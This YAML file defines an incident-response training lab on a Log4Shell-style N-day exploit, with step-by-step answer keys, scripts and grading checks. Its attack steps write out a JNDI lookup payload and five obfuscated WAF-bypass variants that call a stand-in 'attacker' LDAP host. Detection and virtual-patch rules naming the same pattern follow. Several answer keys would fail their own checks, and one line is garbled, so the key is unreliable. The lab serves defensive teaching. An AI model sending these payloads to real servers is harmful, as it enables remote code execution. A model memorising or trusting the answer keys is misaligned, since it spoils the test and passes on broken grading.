lab_id: agent-ir-adv-nonai-week06
title: N-day 대규모 악용 (Log4Shell 계열) IR (Non-AI)
version: nonai
course: agent-ir-adv-nonai
week: 6
description: 공개 후 4시간 내 대응. Virtual Patch 2h / Emergency Patch 48h SLA. 학생이 수동 수행·기록.
difficulty: hard
duration_minutes: 150
objectives:
- 공격 원리를 이해하고 재현한다
- 탐지·분석·초동대응·보고·재발방지의 6단계를 수행한다
- Human vs Agent 대응을 비교한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: Log4Shell 페이로드 예시
  hint: 6단계 IR 중 공격 단계. target_vm=web.
  category: attack
  points: 9
  answer: echo '${jndi:ldap://attacker/a}' > /tmp/w06-log4shell.txt && cat /tmp/w06-log4shell.txt
  answer_detail: '[공격] 기본 페이로드.'
  verify:
    type: output_contains
    expect: jndi
    field: stdout
  target_vm: web
  script: echo '${jndi:ldap://attacker/a}' > /tmp/w06-log4shell.txt && cat /tmp/w06-log4shell.txt
  risk_level: low
  bastion_prompt: ''
- order: 2
  instruction: 변형 페이로드 5종
  hint: 6단계 IR 중 공격 단계. target_vm=web.
  category: attack
  points: 10
  answer: 'cat > /tmp/w06-variants.txt <<''T''

    ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker/a}

    ${${lower:j}ndi:ldap://attacker/a}

    ${${env:BARFOO:-j}ndi:ldap://attacker/a}

    ${jndi:${lower:l}${lower:d}${lower:a}p://attacker/a}

    ${jndi:ldap://${::-attacker}/a}

    T

    cat /tmp/w06-variants.txt'
  answer_detail: '[공격] 변형으로 WAF 우회.'
  verify:
    type: output_contains
    expect: jndi
    field: stdout
  target_vm: web
  script: 'cat > /tmp/w06-variants.txt <<''T''

    ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker/a}

    ${${lower:j}ndi:ldap://attacker/a}

    ${${env:BARFOO:-j}ndi:ldap://attacker/a}

    ${jndi:${lower:l}${lower:d}${lower:a}p://attacker/a}

    ${jndi:ldap://${::-attacker}/a}

    T

    cat /tmp/w06-variants.txt'
  risk_level: low
  bastion_prompt: ''
- order: 3
  instruction: Suricata/SIGMA 룰
  hint: 6단계 IR 중 탐지 단계. target_vm=siem.
  category: analysis
  points: 11
  answer: "mkdir -p ~/w06 && cat > ~/w06/rule.yml <<'Y'\ntitle: Log4Shell JNDI burst\n\
    detection:\n  selection:\n    payload|contains: ['${jndi:', '${${::-j}${::-n}']\n\
    \  condition: selection\nlevel: critical\nY\ncat ~/w06/rule.yml"
  answer_detail: '[탐지] JNDI 패턴 탐지.'
  verify:
    type: output_contains
    expect: jndi
    field: stdout
  target_vm: siem
  script: "mkdir -p ~/w06 && cat > ~/w06/rule.yml <<'Y'\ntitle: Log4Shell JNDI burst\n\
    detection:\n  selection:\n    payload|contains: ['${jndi:', '${${::-j}${::-n}']\n\
    \  condition: selection\nlevel: critical\nY\ncat ~/w06/rule.yml"
  risk_level: low
  bastion_prompt: ''
- order: 4
  instruction: CISA KEV 구독
  hint: 6단계 IR 중 탐지 단계. target_vm=bastion.
  category: analysis
  points: 12
  answer: 'cat > ~/w06/kev-feed.md <<''M''

    - https://www.cisa.gov/known-exploited-vulnerabilities

    - 일일 자동 fetch

    - 신규 CVE + 조직 SBOM 매칭 시 경보

    M

    cat ~/w06/kev-feed.md'
  answer_detail: '[탐지] 실제 악용 확인된 CVE만.'
  verify:
    type: output_contains
    expect: KEV
    field: stdout
  target_vm: bastion
  script: 'cat > ~/w06/kev-feed.md <<''M''

    - https://www.cisa.gov/known-exploited-vulnerabilities

    - 일일 자동 fetch

    - 신규 CVE + 조직 SBOM 매칭 시 경보

    M

    cat ~/w06/kev-feed.md'
  risk_level: low
  bastion_prompt: ''
- order: 5
  instruction: SBOM 매칭
  hint: 6단계 IR 중 분석 단계. target_vm=bastion.
  category: analysis
  points: 13
  answer: 'cat > ~/w06/sbom.json <<''J''

    {"components":[{"name":"log4j-core","version":"2.14.1","locations":["app-a","app-b"]}]}

    J

    cat ~/w06/sbom.json'
  answer_detail: '[분석] SBOM이 있어야 분 단위 영향 평가.'
  verify:
    type: output_contains
    expect:
    - log4j
    - SBOM
    field: stdout
  target_vm: bastion
  script: 'cat > ~/w06/sbom.json <<''J''

    {"components":[{"name":"log4j-core","version":"2.14.1","locations":["app-a","app-b"]}]}

    J

    cat ~/w06/sbom.json'
  risk_level: low
  bastion_prompt: ''
- order: 6
  instruction: 공격 시도 vs 성공 구분
  hint: 6단계 IR 중 분석 단계. target_vm=bastion.
  category: analysis
  points: 14
  answer: 'cat > ~/w06/verify.md <<''M''

    - 네트워크: JNDI 페이로드 관찰 여부

    - 시스템: 비정상 aws out (ldap/rmi)

    - 앱: stack trace에 JndiLookup

    M

    cat ~/w06/verify.md'
  answer_detail: '[분석] 3증거.'
  verify:
    type: output_contains
    expect:
    - JNDI
    - 구분
    field: stdout
  target_vm: bastion
  script: 'cat > ~/w06/verify.md <<''M''

    - 네트워크: JNDI 페이로드 관찰 여부

    - 시스템: 비정상 aws out (ldap/rmi)

    - 앱: stack trace에 JndiLookup

    M

    cat ~/w06/verify.md'
  risk_level: low
  bastion_prompt: ''
- order: 7
  instruction: Virtual Patch WAF
  hint: 6단계 IR 중 초동대응 단계. target_vm=web.
  category: analysis
  points: 15
  answer: "cat > ~/w06/virtual-patch.rules <<'R'\nSecRule ARGS|REQUEST_HEADERS \\\n\
    \  \"@rx \\\\$\\\\{jndi:\" \\\n  \"id:9001000,phase:2,deny,status:403\"\nR\ncat\
    \ ~/w06/virtual-patch.rules"
  answer_detail: '[초동대응] 2시간 내 배포.'
  verify:
    type: output_contains
    expect:
    - jndi
    - 가상패치
    field: stdout
  target_vm: web
  script: "cat > ~/w06/virtual-patch.rules <<'R'\nSecRule ARGS|REQUEST_HEADERS \\\n\
    \  \"@rx \\\\$\\\\{jndi:\" \\\n  \"id:9001000,phase:2,deny,status:403\"\nR\ncat\
    \ ~/w06/virtual-patch.rules"
  risk_level: low
  bastion_prompt: ''
- order: 8
  instruction: Emergency Patch 결정 매트릭스
  hint: 6단계 IR 중 초동대응 단계. target_vm=bastion.
  category: analysis
  points: 16
  answer: 'cat > ~/w06/decision.md <<''M''

    - 자산 노출? → Y

    - 패치 호환성 테스트됨? → N

    - SLA 수용 가능? → Y

    → Virtual Patch + 주말 패치 배포

    M

    cat ~/w06/decision.md'
  answer_detail: '[초동대응] 결정 흐름.'
  verify:
    type: output_contains
    expect: Virtual
    field: stdout
  target_vm: bastion
  script: 'cat > ~/w06/decision.md <<''M''

    - 자산 노출? → Y

    - 패치 호환성 테스트됨? → N

    - SLA 수용 가능? → Y

    → Virtual Patch + 주말 패치 배포

    M

    cat ~/w06/decision.md'
  risk_level: low
  bastion_prompt: ''
- order: 9
  instruction: Agent Playbook
  hint: 6단계 IR 중 초동대응 단계. target_vm=bastion.
  category: analysis
  points: 17
  answer: "cat > ~/w06/agent.yaml <<'Y'\nplaybook_id: pb-nday-response\nsteps:\n \
    \ - skill: fetch_cve_feed\n  - skill: match_sbom\n  - skill: deploy_virtual_patch\n\
    \  - skill: open_emergency_patch_ticket\nY\ncat ~/w06/agent.yaml"
  answer_detail: '[초동대응] 자동 파이프라인.'
  verify:
    type: output_contains
    expect:
    - virtual_patch
    - Playbook
    field: stdout
  target_vm: bastion
  script: "cat > ~/w06/agent.yaml <<'Y'\nplaybook_id: pb-nday-response\nsteps:\n \
    \ - skill: fetch_cve_feed\n  - skill: match_sbom\n  - skill: deploy_virtual_patch\n\
    \  - skill: open_emergency_patch_ticket\nY\ncat ~/w06/agent.yaml"
  risk_level: low
  bastion_prompt: ''
- order: 10
  instruction: 임원 브리핑
  hint: 6단계 IR 중 보고 단계. target_vm=bastion.
  category: analysis
  points: 18
  answer: 'cat > ~/w06/exec.md <<''M''

    # CVE-YYYY-NNNNN

    **What**: 신규 CVE. 영향 12개. Bastion Virtual Patch.

    **Impact**: 공격 시도 관찰. 악용 증거 없음.

    **Ask**: Emergency Patch 야간 배포.

    M

    cat ~/w06/exec.md'
  answer_detail: '[보고] 승인 요청.'
  verify:
    type: output_contains
    expect: Emergency
    field: stdout
  target_vm: bastion
  script: 'cat > ~/w06/exec.md <<''M''

    # CVE-YYYY-NNNNN

    **What**: 신규 CVE. 영향 12개. Bastion Virtual Patch.

    **Impact**: 공격 시도 관찰. 악용 증거 없음.

    **Ask**: Emergency Patch 야간 배포.

    M

    cat ~/w06/exec.md'
  risk_level: low
  bastion_prompt: ''
- order: 11
  instruction: VulnOps SLA
  hint: 6단계 IR 중 재발방지 단계. target_vm=bastion.
  category: analysis
  points: 19
  answer: 'cat > ~/w06/vulnops-sla.md <<''M''

    - Virtual Patch: 2h

    - Emergency Patch: 48h

    - 정기 패치: 15일

    - SBOM 자동 생성: CI 통합

    M

    cat ~/w06/vulnops-sla.md'
  answer_detail: '[재발방지] 조직 SLA.'
  verify:
    type: output_contains
    expect: 48h
    field: stdout
  target_vm: bastion
  script: 'cat > ~/w06/vulnops-sla.md <<''M''

    - Virtual Patch: 2h

    - Emergency Patch: 48h

    - 정기 패치: 15일

    - SBOM 자동 생성: CI 통합

    M

    cat ~/w06/vulnops-sla.md'
